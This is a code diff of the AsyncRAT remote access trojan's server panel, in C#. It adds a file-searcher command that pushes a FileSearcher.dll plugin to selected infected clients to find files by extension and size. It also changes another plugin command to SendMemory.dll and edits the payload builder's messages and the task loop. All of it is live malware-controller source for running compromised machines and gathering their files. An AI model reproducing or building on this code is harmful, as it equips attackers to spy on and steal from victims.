@@ -313,7 +313,7 @@ namespace Server
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "plugin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendMemory.dll"));
                     msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
                     foreach (Clients client in GetSelectedClients())
@@ -844,6 +844,35 @@ namespace Server
             }
         }
 
+        private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (FormFileSearcher form = new FormFileSearcher())
+            {
+
+                if (form.ShowDialog() == DialogResult.OK)
+                {
+                    if (listView1.SelectedItems.Count > 0)
+                    {
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "fileSearcher";
+                        packet.ForcePathObject("SizeLimit").AsInteger = (long)form.numericUpDown1.Value * 1000 * 1000;
+                        packet.ForcePathObject("Extensions").AsString = form.txtExtnsions.Text;
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileSearcher.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
+                        {
+                            client.LV.ForeColor = Color.Red;
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                }
+            }
+        }
+
         #endregion
 
         #region Extra
@@ -1321,7 +1350,7 @@ namespace Server
         private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
         {
 #if DEBUG
-            MessageBox.Show("You can't build using a debug version.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            MessageBox.Show("You can't build using a 'debug' version, Please use the 'release' version", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
             return;
 #endif
             using (FormBuilder formBuilder = new FormBuilder())
@@ -1425,7 +1454,8 @@ namespace Server
         {
             try
             {
-                if (getTasks.Count > 0 && GetAllClients().Length > 0)
+                Clients[] clients = GetAllClients();
+                if (getTasks.Count > 0 && clients.Length > 0)
                     foreach (AsyncTask asyncTask in getTasks.ToList())
                     {
                         if (GetListview(asyncTask.id) == false)
@@ -1435,7 +1465,7 @@ namespace Server
                             return;
                         }
 
-                        foreach (Clients client in GetAllClients())
+                        foreach (Clients client in clients)
                         {
                             if (!asyncTask.doneClient.Contains(client.ID))
                             {
@@ -1744,5 +1774,6 @@ namespace Server
 
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
+
     }
 }
